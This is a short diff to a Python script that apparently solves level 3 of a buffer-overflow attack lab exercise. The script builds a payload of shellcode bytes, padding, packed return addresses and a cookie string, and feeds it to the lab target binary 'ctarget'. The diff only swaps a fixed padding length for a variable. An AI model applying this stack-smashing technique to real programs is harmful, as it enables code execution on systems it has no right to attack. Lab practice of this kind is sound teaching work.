@@ -56,7 +56,7 @@ buff = int(gdb_output[gdb_output.find('0x41414141') - 10:][:8], 16)
 shellcode_bytes = b'\x5f\xc3'
 val = buff + buffsize + 3 * 8 # cookie_str_ptr
 
-level3 = shellcode_bytes + ((56 - len(shellcode_bytes)) * 'A').encode() + pack('<Q', buff) + pack('<Q', val) + pack('<Q', touch3) + str(hex(cookie)[2:]).encode()
+level3 = shellcode_bytes + ((buffsize - len(shellcode_bytes)) * 'A').encode() + pack('<Q', buff) + pack('<Q', val) + pack('<Q', touch3) + str(hex(cookie)[2:]).encode()
 open('level3input', 'wb').write(level3)
 os.system("./ctarget < level3input")
 
